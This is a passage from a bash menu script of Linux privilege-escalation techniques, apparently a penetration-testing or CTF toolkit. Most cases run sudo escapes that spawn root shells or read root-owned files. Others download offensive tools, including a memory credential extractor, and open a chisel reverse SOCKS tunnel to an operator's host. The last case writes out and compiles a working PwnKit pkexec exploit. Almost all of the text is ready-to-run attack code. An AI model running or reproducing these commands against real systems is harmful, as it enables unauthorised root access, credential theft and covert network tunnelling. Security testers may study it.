		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo ul "$LFILE"
		fi
	;;
	"450")
		echo "Digit a root's file to make readable"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo unexpand -t99999999 "$LFILE"
		fi
	;;
	"451")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo uniq "$LFILE"
		fi
	;;
	"452")
		sudo unshare /bin/sh
	;;
	"453")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo uuencode "$LFILE" /dev/stdout | uudecode
		fi
	;;
	"454")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo uuencode "$LFILE" /dev/stdout | uudecode
		fi
	;;
	"455")
		sudo valgrind /bin/sh
	;;
	"456")
		sudo vi -c ':!/bin/sh' /dev/null
	;;
	"457")
		sudo view -c ':!/bin/sh'
	;;
	"458")
		sudo vigr
	;;
	"459")
		sudo vim -c ':!/bin/sh'
	;;
	"460")
		sudo vimdiff -c ':!/bin/sh'
	;;
	"461")
		sudo vipw
	;;
	"462")
		sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'
	;;
	"463")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo wc --files0-from "$LFILE"
		fi
	;;
	"464")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo whiptail --textbox --scrolltext "$LFILE" 0 0
		fi
	;;
	"465")
		echo "exec /bin/sh <@stdin >@stdout 2>@stderr"
		sudo wish
	;;
	"466")
		sudo xargs -a /dev/null sh
	;;
	"467")
		sudo xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
	;;
	"468")
		sudo xetex --shell-escape '\write18{/bin/sh}\end'
	;;
	"469")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo xmodmap -v $LFILE
		fi
	;;
	"470")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo xmore $LFILE
		fi
	;;
	"471")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo xxd "$LFILE" | xxd -r
		fi
	;;
	"472")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo xz -c "$LFILE" | xz -d
		fi
	;;
	"473")
		sudo yarn exec /bin/sh
	;;
	"474")
		TF=$(mktemp -u)
		sudo zip $TF /etc/hosts -T -TT 'sh #'
		sudo rm $TF
	;;
	"475")
		sudo zsh
	;;
	"476")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo zsoelim "$LFILE"
		fi
	;;
	"477")
		echo "Digit a command to watch sudo technique from gtfobins"
		read -p "(example, zip): " SDCMD
		if [[ "$SDCMD" != "" ]];
		then
			$CURLP -s -k -L "https://gtfobins.github.io/gtfobins/""$SDCMD""/#sudo" | less
		fi
	;;
	"478")
		URT="spencerdodd/kernelpop/releases"
		URD="$URT""/download"
		select CHC in $(curl -s -k -L "$ENTSSL""$URT"|grep "href"|grep "$URD"|grep "kernelpop-macos-highsierra-x64"|awk -F \" '{print $2}')
		do
			Scarica "spencerdodd/kernelpop" "$ENTSSL""$CHC" "kernelpop-macos-highsierra-x64"
			break
		done
	;;
	"479")
		Scarica "lightfaith/locasploit" "$ENTSSL""lightfaith/locasploit/archive/refs/heads/master.zip" "locasploit.zip"
	;;
	"480")
		Scarica "rek7/mXtract" "ENTSSL""rek7/mXtract/archive/refs/heads/master.zip" "mXtract.zip"
	;;
	"481")
		echo "Digit the chisel release version"
		read -e -p "(example, chisel_1.7.7_linux_amd64): " CHSL
		if [[ -f $CHSL && "$CHSL" != "" ]];
		then
			echo "Digit YOUR machine's IP:PORT"
			read -p "(example, 10.11.12.13:8080): " MHST
			if [[ "$MHST" != "" ]];
			then
				chmod +x ./$CHSL
				./$CHSL client "$MHST" R:socks
			fi
		fi
	;;
	"482")
		echo -e "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nvoid gconv() {}\n\nvoid gconv_init() {\n\tsetuid(0);\n\tsetgid(0);\n\tsetgroups(0);\n\texecve(\"/bin/sh\", NULL, NULL);\n}" > evil-so.c
		echo -e "#include <stdio.h>\n#include <stdlib.h>\n#define BIN \"/usr/bin/pkexec\"\n#define DIR \"evildir\"\n#define EVILSO \"evil\"\nint main()\n{\n\tchar *envp[] = {\n\tDIR,\n\t\"PATH=GCONV_PATH=.\",\n\t\"SHELL=ryaagard\",\n\t\"CHARSET=ryaagard\",\n\tNULL\n\t};\n\tchar *argv[] = { NULL };\n\tsystem(\"mkdir GCONV_PATH=.\");\n\tsystem(\"touch GCONV_PATH=./\" DIR \" && chmod 777 GCONV_PATH=./\" DIR);\n\tsystem(\"mkdir \" DIR);\n\tsystem(\"echo 'module\\\tINTERNAL\\\t\\\t\\\tryaagard//\\\t\\\t\\\t\" EVILSO \"\\\t\\\t\\\t2' > \" DIR \"/gconv-modules\");\n\tsystem(\"cp \" EVILSO \".so \" DIR);\n\texecve(BIN, argv, envp);\n\treturn 0;\n}" > exploit.c
		gcc -shared -o evil.so -fPIC evil-so.c
		gcc exploit.c -o exploit
	;;
	*)
		echo "error, invalid choice"
	;;
	esac
	read -p "Press ENTER to continue..."
done
